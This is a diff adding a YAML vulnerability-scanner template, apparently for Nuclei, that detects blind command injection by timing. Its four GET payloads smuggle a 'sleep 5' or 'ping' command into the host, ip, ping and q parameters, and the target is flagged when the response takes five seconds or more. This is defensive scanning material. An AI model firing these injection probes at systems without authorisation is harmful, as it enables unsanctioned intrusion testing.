@@ -1,0 +1,20 @@
+id: m7-cmdi-blind-time
+info:
+  name: M7 - Blind Command Injection via Time Delay
+  author: Sharlix
+  severity: critical
+  description: Blind CMDi via sleep command timing
+  tags: cmdi,blind,time-based,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?host=127.0.0.1;sleep 5"
+      - "{{BaseURL}}?ip=127.0.0.1|sleep 5"
+      - "{{BaseURL}}?ping=127.0.0.1 & ping -n 5 127.0.0.1"
+      - "{{BaseURL}}?q=test`sleep 5`"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
